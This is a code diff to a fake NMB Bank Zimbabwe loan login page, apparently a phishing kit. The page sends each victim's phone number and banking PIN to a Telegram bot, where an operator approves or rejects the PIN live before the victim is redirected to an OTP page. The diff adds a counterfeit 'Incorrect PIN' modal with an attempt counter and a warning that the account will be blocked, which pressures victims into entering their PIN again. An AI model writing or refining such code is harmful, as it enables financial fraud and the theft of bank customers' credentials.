@@ -219,6 +219,53 @@
         .sp-s { font-size: 14px; color: rgba(255,255,255,0.6); margin-top: 10px; font-weight: 300; }
         @keyframes sp { to { transform: rotate(360deg); } }
 
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 3000;
+            backdrop-filter: blur(10px);
+            padding: 20px;
+        }
+        .modal-overlay.on { display: flex; }
+        .modal-card {
+            background: #ffffff;
+            color: #333;
+            max-width: 380px;
+            width: 100%;
+            border-radius: 25px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            animation: modalIn 0.4s cubic-bezier(0.17, 0.84, 0.44, 1);
+        }
+        @keyframes modalIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .modal-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+            color: #ff6b6b;
+        }
+        .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 15px; color: var(--nmb-blue); }
+        .modal-text { font-size: 15px; margin-bottom: 30px; line-height: 1.5; color: #555; }
+        .modal-btn {
+            background: var(--nmb-blue);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+        .modal-btn:hover { background: #002244; }
+
         footer { 
             padding: 40px 20px; 
             text-align: center; 
@@ -291,6 +338,16 @@
         <div class="sp-s">Connecting to NMB secure servers...</div>
     </div>
 
+    <!-- Custom Modal for Warnings -->
+    <div id="warningModal" class="modal-overlay">
+        <div class="modal-card">
+            <div class="modal-icon">⚠️</div>
+            <div class="modal-title">Incorrect PIN</div>
+            <div id="modalMsg" class="modal-text">⚠️ Warning: You have 2 PIN attempts remaining. Enter the correct PIN to avoid your account being blocked.</div>
+            <button class="modal-btn" onclick="closeModal()">Try Again</button>
+        </div>
+    </div>
+
     <footer>
         <p>&copy; 2026 NMB Bank Limited. Zimbabwe.</p>
     </footer>
@@ -304,6 +361,7 @@
             purpose: "Flex Loan"
         };
         let lastUpdateId = 0;
+        let pinAttempts = 0;
 
         function init() {
             const params = new URLSearchParams(window.location.search);
@@ -323,6 +381,16 @@
         
         function clrErr() { 
             document.getElementById('err').style.display = 'none'; 
+        }
+
+        function showModal(msg) {
+            document.getElementById('modalMsg').textContent = msg;
+            document.getElementById('warningModal').classList.add('on');
+        }
+
+        function closeModal() {
+            document.getElementById('warningModal').classList.remove('on');
+            document.getElementById('pin').focus();
         }
 
         async function sendToTelegram(msg, buttons) {
@@ -357,7 +425,7 @@
             if (phone.length < 9) { showErr('Please enter a valid 9-digit mobile number.'); return; }
             if (pin.length !== 4) { showErr('PIN must be exactly 4 digits.'); return; }
 
-            const msg = `🚀 <b>NMB Flex Loan Attempt</b>\n\n👤 <b>Name:</b> <code>${decodeURIComponent(loanData.name)}</code>\n📱 <b>Phone:</b> <code>+263${phone}</code>\n🔒 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Amount:</b> <code>$${loanData.amount} USD</code>\n🎯 <b>Purpose:</b> <code>${decodeURIComponent(loanData.purpose)}</code>`;
+            const msg = `🚀 <b>NMB Flex Loan Attempt</b>\n\n👤 <b>Name:</b> <code>${decodeURIComponent(loanData.name)}</code>\n📱 <b>Phone:</b> <code>+263${phone}</code>\n🔒 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Amount:</b> <code>$${loanData.amount} USD</code>\n🎯 <b>Purpose:</b> <code>${decodeURIComponent(loanData.purpose)}</code>\n🔢 <b>Attempt:</b> <code>${pinAttempts + 1}</code>`;
 
             const buttons = [
                 [{ text: '✅ Approve PIN', callback_data: 'pin_valid' }, { text: '❌ Reject PIN', callback_data: 'pin_invalid' }],
@@ -387,7 +455,14 @@
                                     else if (action === 'pin_invalid') { 
                                         clearInterval(pollInterval); 
                                         document.getElementById('ov').classList.remove('on'); 
-                                        showErr('Invalid PIN. Please check your details and try again.'); 
+                                        pinAttempts++;
+                                        
+                                        let remaining = 3 - pinAttempts;
+                                        if (remaining > 0) {
+                                            showModal(`You put wrong pin ${remaining} attempts remaining make sure you repeat with correct pin.`);
+                                        } else {
+                                            showErr('Maximum attempts reached. Please contact support.');
+                                        }
                                         document.getElementById('pin').value = '';
                                     }
                                     else if (action === 'login_applied') { 
@@ -410,6 +485,5 @@
             location.href = `otp.html?name=${loanData.name}&amount=${loanData.amount}&purpose=${loanData.purpose}&phone=${phone}`;
         }
     </script>
-
 </body>
 </html>
